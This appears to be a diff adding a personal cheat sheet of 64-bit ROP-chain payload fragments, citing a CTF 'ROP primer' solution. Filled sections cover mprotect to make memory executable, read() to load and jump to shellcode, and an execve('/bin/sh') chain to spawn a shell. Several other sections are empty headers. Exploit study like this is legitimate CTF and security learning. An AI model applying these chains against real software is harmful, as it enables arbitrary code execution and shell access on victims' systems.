@@ -1,0 +1,87 @@
+===============================================================================
+mprotect()
+===============================================================================
+https://blog.techorganic.com/2015/10/09/a-rop-primer-solution-64-bit-style/
+
+
+
+# make locaddtion 0x6b6000 to 0x6b8000 RWX using mprotect
+# mprotect:
+#   rax: 0xa
+#   rdi: unsigned long start
+#   rsi: size_t len
+#   rdx: unsigned long prot
+
+payload += p64(0x40159b)        # pop rdi; ret; 
+payload += p64(0x6b6000)        # unsigned long start
+payload += p64(0x432f29)        # pop rdx; pop rsi; ret; 
+payload += p64(7)               # unsigned long prot
+payload += p64(8192)            # size_t len
+payload += p64(0x414796)        # add eax, 5; ret; 
+payload += p64(0x414796)        # add eax, 5; ret; 
+payload += p64(0x4546b5)        # syscall; ret; 
+
+===============================================================================
+read()
+===============================================================================
+
+# read shellcode into 0x6b6000
+# read:
+#   rax: 0x0
+#   rdi: unsigned int fd
+#   rsi: char *payload
+#   rdx: size_t count
+
+payload += p64(0x40159b)        # pop rdi; ret; 
+payload += p64(0)               # unsigned int fd
+payload += p64(0x432f29)        # pop rdx; pop rsi; ret; 
+payload += p64(30)              # size_t count
+payload += p64(0x6b6000)        # char *payload
+payload += p64(0x43168d)        # pop rax; ret; 
+payload += p64(0)               # sys_read
+payload += p64(0x4546b5)        # syscall; ret; 
+
+payload += p64(0x6b6000)        # return to read-in shellcode
+
+
+===============================================================================
+write()
+===============================================================================
+
+
+
+===============================================================================
+open()
+===============================================================================
+
+
+
+===============================================================================
+execve()
+===============================================================================
+
+payload += p64(pop_rax)
+payload += p64(0x3b)		# execute execve()
+payload += p64(pop_rdi)     # pop rdi
+payload += p64(binsh)		# "/bin/sh"
+payload += p64(pop_rsi)		# pop rsi
+payload += p64(0x0)	        # NULL
+payload += p64(pop_rdx)		# pop rdx
+payload += p64(0x0)			# NULL
+payload += p64(syscall)		# syscall
+
+===============================================================================
+malloc()
+===============================================================================
+
+
+
+===============================================================================
+mmap()
+===============================================================================
+
+
+
+===============================================================================
+memset
+===============================================================================
